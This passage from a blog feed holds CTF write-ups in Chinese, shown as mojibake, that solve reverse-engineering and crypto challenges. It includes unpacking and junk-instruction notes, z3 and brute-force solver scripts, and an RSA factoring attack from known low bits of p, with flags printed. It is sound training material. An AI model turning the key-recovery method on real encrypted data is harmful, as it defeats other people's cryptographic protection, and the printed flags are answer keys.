å°±å¯ä»¥å¾—åˆ°flag</p><img src="/2024/10/25/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2022%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1729825549554-47c0e11a-a5f4-4dab-b3c2-1d4c9c5900aa.png" class="" title="img"><h2 id="EzMath2"><a href="#EzMath2" class="headerlink" title="EzMath2"></a>EzMath2</h2><p>upxé­”æ”¹</p><img src="/2024/10/25/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2022%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1729771704424-ccfd392b-4583-4633-a722-7dd9fb1797ad.png" class="" title="img"><p>è„±å£³åå‘ç°ä¸€å¼€å§‹çš„ä¸€ä¸ªå‡½æ•°ä¿®æ”¹äº†å¯†æ–‡</p><img src="/2024/10/25/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2022%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1729783737514-4b646adf-f56f-4568-9f55-cb9f8d58e9c6.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0x3A</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x29</span>,<br>  <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x69</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    a[i]=(a[i]*<span class="hljs-number">43</span>)%<span class="hljs-number">127</span><br><span class="hljs-built_in">print</span>(a)<br></code></pre></td></tr></table></figure><p>é‡åˆ°èŠ±æŒ‡ä»¤</p><img src="/2024/10/25/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2022%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1729772470104-087b52c5-40bd-496f-8396-09c8d9622c6b.png" class="" title="img"><p>nop retä¹‹ååˆ é™¤ä¸¤ä¸ªå‡½æ•°å†åˆ›å»ºå‡½æ•°å³å¯å»é™¤èŠ±æŒ‡ä»¤</p><img src="/2024/10/25/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2022%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1729783803282-dc4c8178-4dc5-4f14-b651-44de3d9423f4.png" class="" title="img"><p>å¯ä»¥ç›´æ¥çˆ†ç ´æˆ–è€…é€†</p><img src="/2024/10/25/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2022%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1729772632451-51455e03-7c0c-4820-8592-c7d1216cf5ea.png" class="" title="img"><p>è¿™é¢˜æ— æ³•åŠ¨æ€è°ƒè¯•ï¼Œåªèƒ½é™æ€åˆ†æäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">81</span>, <span class="hljs-number">81</span>, <span class="hljs-number">107</span>, <span class="hljs-number">47</span>, <span class="hljs-number">54</span>, <span class="hljs-number">52</span>, <span class="hljs-number">87</span>, <span class="hljs-number">71</span>, <span class="hljs-number">54</span>, <span class="hljs-number">112</span>, <span class="hljs-number">113</span>, <span class="hljs-number">126</span>, <span class="hljs-number">97</span>, <span class="hljs-number">81</span>, <span class="hljs-number">116</span>, <span class="hljs-number">123</span>, <span class="hljs-number">112</span>, <span class="hljs-number">70</span>]<br>s=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a),<span class="hljs-number">2</span>):<br>    a[i]=(a[i]+<span class="hljs-number">1</span>)^<span class="hljs-number">7</span><br>    a[i+<span class="hljs-number">1</span>]=(a[i+<span class="hljs-number">1</span>]*inverse(<span class="hljs-number">57</span>,<span class="hljs-number">127</span>)%<span class="hljs-number">127</span>)&amp;<span class="hljs-number">0x7f</span><br>    s+=<span class="hljs-built_in">chr</span>(a[i])<br>    s += <span class="hljs-built_in">chr</span>(a[i+<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(s)<br><span class="hljs-comment"># for i in range(len(a)):</span><br><span class="hljs-comment">#     for j in range(32,127):</span><br><span class="hljs-comment">#         k=j</span><br><span class="hljs-comment">#         if i%2:</span><br><span class="hljs-comment">#            k=57*k%127</span><br><span class="hljs-comment">#            if a[i]==k:</span><br><span class="hljs-comment">#                print(chr(j),end=&quot;&quot;)</span><br><span class="hljs-comment">#         else:</span><br><span class="hljs-comment">#             k=(k^7)-1</span><br><span class="hljs-comment">#             if a[i] == k:</span><br><span class="hljs-comment">#                 print(chr(j), end=&quot;&quot;)</span><br>DASCTF&#123;U_kn0w_M0du1e_rEv~&#125;<br></code></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="math"><a href="#math" class="headerlink" title="math"></a>math</h2><p>ä¸çŸ¥é“factorialçš„å«ä¹‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">import</span> m<br>flag=<span class="hljs-string">&#x27;DASCTF&#123;&#x27;</span>+m+<span class="hljs-string">&#x27;&#125;&#x27;</span><br><span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789+=&#x27;</span><br>n = getPrime(<span class="hljs-number">1024</span>)<br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-comment">#176778040837484895481963794918312894811914463587783883976856801676290821243853364789418908640505211936881707629753845875997805883248035576046706978993073043757445726165605877196383212378074705385178610178824713153854530726380795438083708575716562524587045312909657881223522830729052758566504582290081411626333</span><br>key=math.factorial(n-<span class="hljs-number">1</span>)%n<br>c=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> m:<br>    k=(<span class="hljs-built_in">str</span>.index(i)*key+<span class="hljs-number">7</span>)%<span class="hljs-number">37</span><br>    c+=<span class="hljs-built_in">str</span>[k]<br><br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-comment">#u66hp7nuh01puoaip10pi6o0vzavnu11</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯å¯ä»¥æœ¬åœ°æ¨¡æ‹Ÿçœ‹å‡½æ•°è§£é‡Šï¼Œå‘ç°æ˜¯æ±‚é˜¶å±‚ï¼Œè¯•äº†å‡ ä¸ªç´ æ•°å‘ç°keyç­‰äºn-1</p><p>é‚£ä¹ˆç›´æ¥æ­£å‘çˆ†ç ´å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789+=&#x27;</span><br>n=<span class="hljs-number">176778040837484895481963794918312894811914463587783883976856801676290821243853364789418908640505211936881707629753845875997805883248035576046706978993073043757445726165605877196383212378074705385178610178824713153854530726380795438083708575716562524587045312909657881223522830729052758566504582290081411626333</span><br>key=n-<span class="hljs-number">1</span><br>c=<span class="hljs-string">&#x27;u66hp7nuh01puoaip10pi6o0vzavnu11&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>        k=j<br>        k=(<span class="hljs-built_in">str</span>.index(k)*key+<span class="hljs-number">7</span>)%<span class="hljs-number">37</span><br>        <span class="hljs-keyword">if</span> c[i]==<span class="hljs-built_in">str</span>[k]:<br>            <span class="hljs-built_in">print</span>(j,end=<span class="hljs-string">&quot;&quot;</span>)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-comment">#799a03b7a82076f5028059681df1b72</span><br></code></pre></td></tr></table></figure><h2 id="rssssa5-1"><a href="#rssssa5-1" class="headerlink" title="rssssa5-1"></a>rssssa5-1</h2><p>çŸ¥é“pçš„ä½560ä½ï¼Œä½†æ˜¯æœ€å¤šæœªçŸ¥ä½æ˜¯454ä½ï¼Œä¹Ÿå°±æ˜¯è‡³å°‘è¦çˆ†ç ´10ä½</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>n = p*q<br>m = bytes_to_long(flag)<br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n =&quot;</span>, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c =&quot;</span>, c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p =&quot;</span>, p&amp;((<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">560</span>) - <span class="hljs-number">1</span>))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 21595945409392994055049935446570173194131443801801845658035469673666023560594683551197545038999238700810747167248724184844583697034436158042499504967916978621608536213230969406811902366916932032050583747070735750876593573387957847683066895725722366706359818941065483471589153682177234707645138490589285500875222568286916243861325846262164331536570517513524474322519145470883352586121892275861245291051589531534179640139953079522307426687782419075644619898733819937782418589025945603603989100805716550707637938272890461563518245458692411433603442554397633470070254229240718705126327921819662662201896576503865953330533</span><br><span class="hljs-string">c = 1500765718465847687738186396037558689777598727005427859690647229619648539776087318379834790898189767401195002186003548094137654979353798325221367220839665289140547664641612525534203652911807047718681392766077895625388064095459224402032253429115181543725938853591119977152518616563668740574496233135226296439754690903570240135657268737729815911404733486976376064060345507410815912670147466261149162470191619474107592103882894806322239740349433710606063058160148571050855845964674224651003832579701204330216602742005466066589981707592861990283864753628591214636813639371477417319679603330973431803849304579330791040664</span><br><span class="hljs-string">p = 1426723861968216959675536598409491243380171101180592446441649834738166786277745723654950385796320682900434611832789544257790278878742420696344225394624591657752431494779</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œçˆ†ç ´äº†15ä½ï¼Œå½“ç„¶12ä½æˆ–è€…å…¶ä»–å¯èƒ½ä¹Ÿè¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> tqdm<br>n = <span class="hljs-number">21595945409392994055049935446570173194131443801801845658035469673666023560594683551197545038999238700810747167248724184844583697034436158042499504967916978621608536213230969406811902366916932032050583747070735750876593573387957847683066895725722366706359818941065483471589153682177234707645138490589285500875222568286916243861325846262164331536570517513524474322519145470883352586121892275861245291051589531534179640139953079522307426687782419075644619898733819937782418589025945603603989100805716550707637938272890461563518245458692411433603442554397633470070254229240718705126327921819662662201896576503865953330533</span><br>c = <span class="hljs-number">1500765718465847687738186396037558689777598727005427859690647229619648539776087318379834790898189767401195002186003548094137654979353798325221367220839665289140547664641612525534203652911807047718681392766077895625388064095459224402032253429115181543725938853591119977152518616563668740574496233135226296439754690903570240135657268737729815911404733486976376064060345507410815912670147466261149162470191619474107592103882894806322239740349433710606063058160148571050855845964674224651003832579701204330216602742005466066589981707592861990283864753628591214636813639371477417319679603330973431803849304579330791040664</span><br>PR.&lt; x &gt; = Zmod(n)[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm.tqdm(<span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">15</span>)):<br>    i = Integer(i)<br>    p = <span class="hljs-number">1426723861968216959675536598409491243380171101180592446441649834738166786277745723654950385796320682900434611832789544257790278878742420696344225394624591657752431494779</span><br>    f = p + i*<span class="hljs-number">2</span>**(<span class="hljs-number">560</span>) + x*<span class="hljs-number">2</span>**(<span class="hljs-number">560</span>+i.nbits())<br>    res = f.monic().small_roots(X=<span class="hljs-number">2</span>^(<span class="hljs-number">1024</span>-<span class="hljs-number">560</span>-i.nbits()), beta=<span class="hljs-number">0.4</span>)<br>    <span class="hljs-keyword">if</span> res:<br>        <span class="hljs-built_in">print</span>(res)<br>        p = p + i*<span class="hljs-number">2</span>**(<span class="hljs-number">560</span>) + <span class="hljs-built_in">int</span>(res[<span class="hljs-number">0</span>])*<span class="hljs-number">2</span>**(<span class="hljs-number">560</span>+i.nbits())<br>        q = n // p<br>        <span class="hljs-keyword">if</span>  p * q==n:<br>            d = inverse(<span class="hljs-number">65537</span>,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>            <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c,d,n))))<br><span class="hljs-comment"># b&#x27;DASCTF&#123;ce73935b2e83a78aa5079a9e59ae4980&#125;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>èŠ±æŒ‡ä»¤</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0xGame2024éƒ¨åˆ†Reverseä¸Crypto</title>
    <link href="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/"/>
    <url>/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/</url>
    
    <content type="html"><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="Xor-Random"><a href="#Xor-Random" class="headerlink" title="Xor_Random"></a>Xor_Random</h3><p>åŠ¨è°ƒè·å–éšæœºæ•°ç›´æ¥å¼‚æˆ–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    srand(<span class="hljs-number">0x77</span>);<br>    rand();<br>    <span class="hljs-type">char</span> v21=<span class="hljs-number">0x7b</span>;<br>    <span class="hljs-type">char</span> v8;<br>    <span class="hljs-type">char</span> a[]=&#123;<span class="hljs-number">0x0C</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x24</span>, <br>              <span class="hljs-number">0x10</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x08</span>, <br>              <span class="hljs-number">0x21</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x5A</span>&#125;;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">30</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span> (i&amp;<span class="hljs-number">1</span>)&#123;<br>            v8=v21;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            v8=v21+<span class="hljs-number">3</span>;<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,a[i]^v8);<br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Zzz"><a href="#Zzz" class="headerlink" title="Zzz"></a>Zzz</h3><p>æ–­ç‚¹ä¸Šé¢æ‰©å±•äº†ä½æ•°ï¼Œä¸”è°ƒè¯•çš„æ—¶å€™å‘ç°è¾“å…¥çš„v5,v6,v7ä¼šè¢«é¢ å€’</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1728800526805-5fc3456b-1834-45fe-a55e-0f53bed05ca2-17300799046741.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span> n2s<br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>v10 = BitVec(<span class="hljs-string">&#x27;v10&#x27;</span>, <span class="hljs-number">32</span>)<br>v11 = BitVec(<span class="hljs-string">&#x27;v11&#x27;</span>, <span class="hljs-number">32</span>)<br>v12 = BitVec(<span class="hljs-string">&#x27;v12&#x27;</span>, <span class="hljs-number">32</span>)<br><br>res=[]<br>solver = Solver()<br>solver.add(<span class="hljs-number">11</span> * v11 + <span class="hljs-number">14</span> * v10 - v12 == <span class="hljs-number">0x48FB41DDD</span>)<br>solver.add(<span class="hljs-number">9</span> * v10 - <span class="hljs-number">3</span> * v11 + <span class="hljs-number">4</span> * v12 == <span class="hljs-number">0x2BA692AD7</span>)<br>solver.add((((v12 - v11)) &gt;&gt; <span class="hljs-number">1</span>) + (v10 ^ <span class="hljs-number">0x87654321</span>) == <span class="hljs-number">3451779756</span>)<br><span class="hljs-keyword">if</span> solver.check()==sat:<br>    model=solver.model()<br>    res.append(n2s(model[v10].as_long()))<br>    res.append(n2s(model[v11].as_long()))<br>    res.append(n2s(model[v12].as_long()))<br><span class="hljs-built_in">print</span>(res)<br><br><span class="hljs-comment">#0xGame&#123;e544267d-7812-44b3-a35d-d085a85201a4&#125;</span><br></code></pre></td></tr></table></figure><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="BabyAsm"><a href="#BabyAsm" class="headerlink" title="BabyAsm"></a>BabyAsm</h3><p>ç›´æ¥æ­£å‘è¾“å‡ºflag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">20</span>,<br>   <span class="hljs-number">92</span>,<br>   <span class="hljs-number">43</span>,<br>   <span class="hljs-number">69</span>,<br>   <span class="hljs-number">81</span>,<br>   <span class="hljs-number">73</span>,<br>   <span class="hljs-number">95</span>,<br>   <span class="hljs-number">23</span>,<br>   <span class="hljs-number">72</span>,<br>   <span class="hljs-number">22</span>,<br>   <span class="hljs-number">24</span>,<br>   <span class="hljs-number">69</span>,<br>   <span class="hljs-number">25</span>,<br>   <span class="hljs-number">27</span>,<br>   <span class="hljs-number">22</span>,<br>   <span class="hljs-number">17</span>,<br>   <span class="hljs-number">23</span>,<br>   <span class="hljs-number">29</span>,<br>   <span class="hljs-number">24</span>,<br>   <span class="hljs-number">73</span>,<br>   <span class="hljs-number">17</span>,<br>   <span class="hljs-number">24</span>,<br>   <span class="hljs-number">85</span>,<br>   <span class="hljs-number">27</span>,<br>   <span class="hljs-number">112</span>,<br>   <span class="hljs-number">76</span>,<br>   <span class="hljs-number">15</span>,<br>   <span class="hljs-number">92</span>,<br>   <span class="hljs-number">24</span>,<br>   <span class="hljs-number">1</span>,<br>   <span class="hljs-number">73</span>,<br>   <span class="hljs-number">84</span>,<br>   <span class="hljs-number">13</span>,<br>   <span class="hljs-number">81</span>,<br>   <span class="hljs-number">12</span>,<br>   <span class="hljs-number">0</span>,<br>   <span class="hljs-number">84</span>,<br>   <span class="hljs-number">73</span>,<br>   <span class="hljs-number">82</span>,<br>   <span class="hljs-number">8</span>,<br>   <span class="hljs-number">82</span>,<br>   <span class="hljs-number">81</span>,<br>   <span class="hljs-number">76</span>,<br>   <span class="hljs-number">125</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(a))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">22</span>):<br>    a[i]+=<span class="hljs-number">28</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">22</span>,<span class="hljs-number">43</span>):<br>    a[i]=a[i]^a[i-<span class="hljs-number">22</span>]<br>s=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    s+=<span class="hljs-built_in">chr</span>(a[i])<br><span class="hljs-built_in">print</span>(s)<br></code></pre></td></tr></table></figure><h3 id="Puzzle"><a href="#Puzzle" class="headerlink" title="Puzzle"></a>Puzzle</h3><p>9*9çš„æ•°ç»„ï¼Œå¤§æ¦‚ç‡æ˜¯æ•°ç‹¬é¢˜</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1729412469694-875ef68b-79a5-442c-99f0-aee73180c7be.png" class="" title="img"><p>æ‰‹ç®—æ¯”è¾ƒéº»çƒ¦ï¼Œå»ºè®®ç›´æ¥å¥—æ¨¡æ¿</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># å®šä¹‰æ•°ç‹¬çš„9x9ç½‘æ ¼</span><br>board = [[<span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], <br>         [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>], <br>         [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>], <br>         [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">7</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], <br>         [<span class="hljs-number">7</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], <br>         [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>], <br>         [<span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span 